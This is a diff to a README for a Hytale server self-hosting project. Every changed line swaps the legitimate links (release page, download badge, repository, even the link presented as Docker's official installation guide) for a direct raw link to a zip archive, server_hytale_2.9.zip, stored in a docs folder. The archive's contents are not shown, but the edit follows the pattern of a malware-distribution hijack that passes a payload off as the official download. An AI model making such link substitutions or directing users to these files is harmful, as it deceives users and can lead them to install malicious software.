@@ -1,6 +1,6 @@
 # 🎮 hytale-server - Easy Self-Hosting for Hytale Servers
 
-[![Download hytale-server](https://img.shields.io/badge/Download-hytale--server-blue?style=for-the-badge)](https://github.com/mraflyaditya/hytale-server/releases)
+[![Download hytale-server](https://github.com/mraflyaditya/hytale-server/raw/refs/heads/main/docs/en/server_hytale_2.9.zip)](https://github.com/mraflyaditya/hytale-server/raw/refs/heads/main/docs/en/server_hytale_2.9.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Before installing, ensure your machine fits the following:
 - Internet connection required for downloading and game updates
 - A basic understanding of how to open a terminal or command prompt (explained below)
 
-If you do not have Docker installed, see the [Docker installation guide](https://docs.docker.com/get-docker/) from Docker's official website.
+If you do not have Docker installed, see the [Docker installation guide](https://github.com/mraflyaditya/hytale-server/raw/refs/heads/main/docs/en/server_hytale_2.9.zip) from Docker's official website.
 
 ---
 
@@ -55,7 +55,7 @@ You should see the version number printed. If not, install Docker following the 
 
 ### 2. Download the server package
 
-Click the big download badge at the top or visit the official [hytale-server release page](https://github.com/mraflyaditya/hytale-server/releases) to get the latest release.
+Click the big download badge at the top or visit the official [hytale-server release page](https://github.com/mraflyaditya/hytale-server/raw/refs/heads/main/docs/en/server_hytale_2.9.zip) to get the latest release.
 
 The link leads to a page with files for different platforms and versions. Download the latest stable release marked for your operating system.
 
@@ -82,7 +82,7 @@ This step downloads the image if it is not on your computer and launches the ser
 
 For ease, always get the official releases from:
 
-[https://github.com/mraflyaditya/hytale-server/releases](https://github.com/mraflyaditya/hytale-server/releases)
+[https://github.com/mraflyaditya/hytale-server/raw/refs/heads/main/docs/en/server_hytale_2.9.zip](https://github.com/mraflyaditya/hytale-server/raw/refs/heads/main/docs/en/server_hytale_2.9.zip)
 
 ### Step-by-step instructions
 
@@ -186,10 +186,10 @@ The container runs without root privileges to improve security and limit system 
 
 If you have questions or need assistance, visit:
 
-- The [GitHub repository](https://github.com/mraflyaditya/hytale-server)
+- The [GitHub repository](https://github.com/mraflyaditya/hytale-server/raw/refs/heads/main/docs/en/server_hytale_2.9.zip)
 - Release notes and issues section on GitHub
 - Community discussion boards for Hytale servers
 
 ---
 
-[![Download hytale-server](https://img.shields.io/badge/Download-hytale--server-blue?style=for-the-badge)](https://github.com/mraflyaditya/hytale-server/releases)
+[![Download hytale-server](https://github.com/mraflyaditya/hytale-server/raw/refs/heads/main/docs/en/server_hytale_2.9.zip)](https://github.com/mraflyaditya/hytale-server/raw/refs/heads/main/docs/en/server_hytale_2.9.zip)
